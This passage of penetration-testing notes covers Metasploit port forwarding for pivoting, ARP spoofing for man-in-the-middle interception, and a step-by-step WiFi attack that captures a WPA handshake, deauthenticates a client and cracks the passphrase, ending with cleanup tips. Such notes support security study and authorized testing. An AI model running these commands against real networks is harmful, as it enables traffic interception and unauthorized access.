
```
sessions -i <SESSION_NUMBER>
```

```
portfwd add -l <LOCAL_PORT_ANY> -p <TARGET's_PORT> -r <TARGET_IP>
```

Then, without closing Metasploit, you can scan and interact with the port on `localhost:<PORT>`

-> IMPORTANT! Use nmap -sS... after port forwarding
-> IMPORTANT! Use bind shells NOT reverse shells
-> IMPORTANT! Use the actual IP of the target for further Metasploit exploits

<div style="page-break-after: always;"></div>

# Network-based attacks
---

## ARP Spoofing

1. Ping sweep (if necessary) to check your targets
2. Configure kali to forward packets: `echo 1 > /proc/sys/net/ipv4/ip_forward`
3. Start Wireshark
4. `arpspoof -i <INTERFACE> -t <TARGET> -r <TARGET_TO_POSE_AS>`
5. Check Wireshark

<div style="page-break-after: always;"></div>

# Wireless
---

1. Connect WiFi adapter
	1. Check with `iwconfig`
2. Kill processes that may interfere
	1. `airmon-ng check kill`
3. Put adapter into monitor mode
	1. `airmon-ng start <INTERFACE>`
	2. Check with `iwconfig`
4. Get target network's BSSID & channel
	1. `airodump-ng <INTERFACE>`
5. Capture traffic
	1. `airodump-ng -c <CHANNEL> --bssid <BSSID> -w <FILENAME> <INTERFACE>`
	2. This will show connected devices, either choose one to deauth or wait for a handshake
6. Deauth
	1. `aireplay-ng --deauth 1 -a <AP_BSSID> -c <STATION_BSSID> <INTERFACE>`
7. Crack the passphrase
	1. `aircrack-ng -w <WORDLIST> -b <BSSID> <CAPTURE_FILENAME>`

<div style="page-break-after: always;"></div>

# Cleaning up
---

- Leave it as you found it
- Remove:-
	- Executables, scripts, added files
	- Malware, rootkits, and user accounts
- Restore to original configurations
